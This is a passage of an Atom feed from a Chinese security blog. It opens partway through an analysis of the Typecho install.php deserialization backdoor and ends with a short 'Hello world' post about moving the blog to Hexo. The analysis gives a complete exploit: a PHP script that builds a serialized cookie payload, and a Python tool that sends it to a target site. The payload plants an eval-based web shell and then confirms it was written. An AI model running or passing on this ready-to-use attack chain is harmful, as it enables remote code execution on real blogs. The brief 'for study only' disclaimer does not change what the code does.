class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'category'</span>]) &amp;&amp; is_array($item[<span class="string">'category'</span>])) &#123;</div><div class="line">                    <span class="keyword">foreach</span> ($item[<span class="string">'category'</span>] <span class="keyword">as</span> $category) &#123;</div><div class="line">                        $content .= <span class="string">'&lt;category&gt;&lt;![CDATA['</span> . $category[<span class="string">'name'</span>] . <span class="string">']]&gt;&lt;/category&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'excerpt'</span>])) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;description&gt;&lt;![CDATA['</span> . strip_tags($item[<span class="string">'excerpt'</span>]) . <span class="string">']]&gt;&lt;/description&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'content'</span>])) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;content:encoded xml:lang="'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'"&gt;&lt;![CDATA['</span></div><div class="line">                    . <span class="keyword">self</span>::EOL .</div><div class="line">                    $item[<span class="string">'content'</span>] . <span class="keyword">self</span>::EOL .</div><div class="line">                    <span class="string">']]&gt;&lt;/content:encoded&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($item[<span class="string">'comments'</span>]) &amp;&amp; strlen($item[<span class="string">'comments'</span>]) &gt; <span class="number">0</span>) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;slash:comments&gt;'</span> . $item[<span class="string">'comments'</span>] . <span class="string">'&lt;/slash:comments&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                $content .= <span class="string">'&lt;comments&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'#comments&lt;/comments&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'commentsFeedUrl'</span>])) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;wfw:commentRss&gt;'</span> . $item[<span class="string">'commentsFeedUrl'</span>] . <span class="string">'&lt;/wfw:commentRss&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'suffix'</span>])) &#123;</div><div class="line">                    $content .= $item[<span class="string">'suffix'</span>];</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                $content .= <span class="string">'&lt;/item&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ($item[<span class="string">'date'</span>] &gt; $lastUpdate) &#123;</div><div class="line">                    $lastUpdate = $item[<span class="string">'date'</span>];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $result .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_title) . <span class="string">'&lt;/title&gt;</span></div><div class="line"><span class="string">&lt;link&gt;'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'&lt;/link&gt;</span></div><div class="line"><span class="string">&lt;atom:link href="'</span> . <span class="keyword">$this</span>-&gt;_feedUrl . <span class="string">'" rel="self" type="application/rss+xml" /&gt;</span></div><div class="line"><span class="string">&lt;language&gt;'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'&lt;/language&gt;</span></div><div class="line"><span class="string">&lt;description&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_subTitle) . <span class="string">'&lt;/description&gt;</span></div><div class="line"><span class="string">&lt;lastBuildDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($lastUpdate) . <span class="string">'&lt;/lastBuildDate&gt;</span></div><div class="line"><span class="string">&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($lastUpdate) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $result .= $content . <span class="string">'&lt;/channel&gt;</span></div><div class="line"><span class="string">&lt;/rss&gt;'</span>;</div><div class="line"></div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">self</span>::ATOM1 == <span class="keyword">$this</span>-&gt;_type) &#123;</div><div class="line">            $result .= <span class="string">'&lt;feed xmlns="http://www.w3.org/2005/Atom"</span></div><div class="line"><span class="string">xmlns:thr="http://purl.org/syndication/thread/1.0"</span></div><div class="line"><span class="string">xml:lang="'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'"</span></div><div class="line"><span class="string">xml:base="'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'"</span></div><div class="line"><span class="string">&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $content = <span class="string">''</span>;</div><div class="line">            $lastUpdate = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</div><div class="line">                $content .= <span class="string">'&lt;entry&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;title type="html"&gt;&lt;![CDATA['</span> . $item[<span class="string">'title'</span>] . <span class="string">']]&gt;&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;link rel="alternate" type="text/html" href="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'" /&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;id&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/id&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;updated&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/updated&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;published&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/published&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;author&gt;</span></div><div class="line"><span class="string">    &lt;name&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;screenName . <span class="string">'&lt;/name&gt;</span></div><div class="line"><span class="string">    &lt;uri&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;url . <span class="string">'&lt;/uri&gt;</span></div><div class="line"><span class="string">&lt;/author&gt;'</span> . <span class="keyword">self</span>::EOL;</div></pre></td></tr></table></figure></p><h2 id="Request-php"><a href="#Request-php" class="headerlink" title="Request.php"></a>Request.php</h2><p>Typecho_Request实例调用__get魔术方法，进入get方法,最后进入_applyFilter方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p><p>$key的值是screenNamem,<br>因此<code>$this-&gt;_params</code>需要是个键为screenNamem的数组，键值为想执行的代码,<br>最终$value传进call_user_func<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</div><div class="line">                $value = <span class="keyword">$this</span>-&gt;_params[$key];</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</div><div class="line">                $value = <span class="keyword">self</span>::$_httpParams[$key];</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                $value = $default;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p><p>进入_applyFilter后,可以看见 call_user_func，<br>这时需要设置<code>$this-&gt;_filter</code>为arrsert，作为call_user_func的第一个参数，<br>$value我们也可控，已经可以执行任意代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</div><div class="line">                $value = is_array($value) ? array_map($filter, $value) :</div><div class="line">                call_user_func($filter, $value);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> $value;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>主要用于生成__typecho_config 的Payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">* Created by PhpStorm.</span></div><div class="line"><span class="comment">* User: RaI4over</span></div><div class="line"><span class="comment">* Date: 2017/10/19</span></div><div class="line"><span class="comment">* Time: 15:17</span></div><div class="line"><span class="comment">* 生成 _typecho_config 的值</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</div><div class="line">    <span class="keyword">private</span> $_type;</div><div class="line">    <span class="keyword">private</span> $_charset;</div><div class="line">    <span class="keyword">private</span> $_lang;</div><div class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($version, $type = self::RSS2, $charset = <span class="string">'UTF-8'</span>, $lang = <span class="string">'en'</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_version = $version;</div><div class="line">        <span class="keyword">$this</span>-&gt;_type = $type;</div><div class="line">        <span class="keyword">$this</span>-&gt;_charset = $charset;</div><div class="line">        <span class="keyword">$this</span>-&gt;_lang = $lang;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'fputs(fopen(\'./usr/themes/default/img/c.php\',\'w\'),\'&lt;?php @eval($_POST[a]);?&gt;\')'</span>);</div><div class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</div><div class="line">    <span class="comment">//private $_filter = array('assert', array('Typecho_Response', 'redirect'));</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = <span class="keyword">new</span> Typecho_Feed(<span class="number">5</span>, <span class="string">'ATOM 1.0'</span>);</div><div class="line">$payload2 = <span class="keyword">new</span> Typecho_Request();</div><div class="line">$payload1-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $payload2));</div><div class="line">$exp[<span class="string">'adapter'</span>] = $payload1;</div><div class="line">$exp[<span class="string">'prefix'</span>] = <span class="string">'Rai4over'</span>;</div><div class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure></p><h1 id="编写payload的简单思路"><a href="#编写payload的简单思路" class="headerlink" title="编写payload的简单思路"></a>编写payload的简单思路</h1><p>最外层$exp是数组，数组中的’adapter’是Typecho_Feed的实例$payload1,<br>$payload1的构造参数是’ATOM 1.0’用于控制分支,<br>$payload2是Typecho_Request的实例,<br><code>private $_filter</code> ，<code>private $_params</code>是传给call_user_func的参数，也就是通过assert写shell<br>然后$payload2通过additem添加到$payload的<code>$_items</code>的变量中<br>最后把$payload1添加到最外层的$exp数组中<br>ps：因为install.php中有ob_start();所以构造好是没有回显的，但是也能写shell<br>后面其他师傅说可以用Typecho_Response类中的redirect方法中的exit()得到回显</p><h1 id="GetShell小工具"><a href="#GetShell小工具" class="headerlink" title="GetShell小工具"></a>GetShell小工具</h1><p>记得把php添加进环境变量<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">''' ____          ____      _ _  _</span></div><div class="line"><span class="string">| __ ) _  _  |  _ \ __ _(_) || |  _____  _____ _ __</span></div><div class="line"><span class="string">|  _ \| | | |  | |_) / _` | | || |_ / _ \ \ / / _ \ '__|</span></div><div class="line"><span class="string">| |_) | |_| |  |  _ &lt; (_| | |__  _| (_) \ V /  __/ |</span></div><div class="line"><span class="string">|____/ \__, |  |_| \_\__,_|_|  |_|  \___/ \_/ \___|_|</span></div><div class="line"><span class="string">      |___/</span></div><div class="line"><span class="string">    '''</span></div><div class="line"></div><div class="line">    targert_url = <span class="string">'http://www.xxxxxxxx.xyz'</span>;</div><div class="line"></div><div class="line">    rsp = requests.get(targert_url + <span class="string">"/install.php"</span>);</div><div class="line">    <span class="keyword">if</span> rsp.status_code != <span class="number">200</span>:</div><div class="line">        exit(<span class="string">'The attack failed and the problem file does not exist !!!'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'You are lucky, the problem file exists, immediately attack !!!'</span></div><div class="line"></div><div class="line">    proxies = &#123;<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>, <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>, &#125;</div><div class="line"></div><div class="line">    typecho_config = os.popen(<span class="string">'php exp.php'</span>).read()</div><div class="line"></div><div class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</div><div class="line">              <span class="string">'Cookie'</span>: <span class="string">'antispame=1508415662; antispamkey=cc7dffeba8d48da508df125b5a50edbd; PHPSESSID=po1hggbeslfoglbvurjjt2lcg0; __typecho_lang=zh_CN;__typecho_config=&#123;typecho_config&#125;;'</span>.format(typecho_config=typecho_config),</div><div class="line">              <span class="string">'Referer'</span>: targert_url&#125;</div><div class="line"></div><div class="line">    url = targert_url + <span class="string">"/install.php?finish=1"</span></div><div class="line"></div><div class="line">    requests.get(url,headers=headers,allow_redirects=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    shell_url = targert_url + <span class="string">'/usr/themes/default/img/c.php'</span></div><div class="line">    <span class="keyword">if</span> requests.get(shell_url).status_code == <span class="number">200</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'shell_url: '</span> + shell_url</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Getshell Fail!"</span></div></pre></td></tr></table></figure></p><p>PS:代码仅用于学习研究，请勿用于非法用途恶意攻击，否则后果作者概不负责。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的.&lt;/p&gt;
&lt;p&gt;然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。&lt;/p&gt;
&lt;h1 id=&quot;恶意代码&quot;&gt;&lt;a href=&quot;#恶意代码&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello world</title>
    <link href="http://www.chabug.org/2017/11/02/hello/"/>
    <id>http://www.chabug.org/2017/11/02/hello/</id>
    <published>2017-11-02T03:12:04.000Z</published>
    <updated>2017-11-05T13:13:11.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h1><p>妈卖批，前几天服务器<code>GG</code>了，如此穷逼的我们连服务器都续费不起，现在没办法，折腾了一晚上，把博客挂到了GitHub。<br>我也很无奈啊。不过也让我学会了怎么用Git+hexo做博客，收获还是有的。</p><hr><h1 id="以前"><a href="#以前" class="headerlink" title="以前"></a>以前</h1><p>以前的文章虽然数据什么的都保存了，但是没有服务器<code>买不起</code>，<del>我也就准备一篇文章一篇文章搬过来了。</del><br>搬个鸡儿，太麻烦了。</p><hr><h1 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h1><p>重新搭起了Hexo，打算重新开始 :)<br>使用<a href="https://github.com/forsigner/fexo" target="_blank" rel="external">fexo</a>主题<br>使用<a href="https://ioliu.cn/2017/add-valine-comments-to-your-blog/" target="_blank" rel="external">valine评论系统</a><br><a href="https://github.com/fancyapps/fancybox" target="_blank" rel="external">fancybox</a>，<a href="https://github.com/rstacruz/nprogress" target="_blank" rel="external">nprogress</a>，<a href="https://github.com/EYHN/hexo-helper-live2d" target="_blank" rel="external">live2d</a>效果以后可能会加。</p><h1 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h1><p>我正在上大一，记得高中老师说，高中紧，大学就松了，都是骗子，我最近忙的要死，天天满课。</p><p>团队中的几位小弟弟@饭饭 差不多都是高三党，@二黑 正忙于工作，每个人都有每个人的事情。</p><p>我不能说保证文章每天的更新，但是我一定保证文章的质量。感谢各位一直相伴ChaBug。</p><hr><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>没什么好说的。<br>希望大家心想事成。</p><hr><p>2017/11/2   初遇亲笔</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前因&quot;&gt;&lt;a href=&quot;#前因&quot; class=&quot;headerlink&quot; title=&quot;前因&quot;&gt;&lt;/a&gt;前因&lt;/h1&gt;&lt;p&gt;妈卖批，前几天服务器&lt;code&gt;GG&lt;/code&gt;了，如此穷逼的我们连服务器都续费不起，现在没办法，折腾了一晚上，把博客挂到了GitHub。
      
    
    </summary>
    
    
  </entry>
  
</feed>
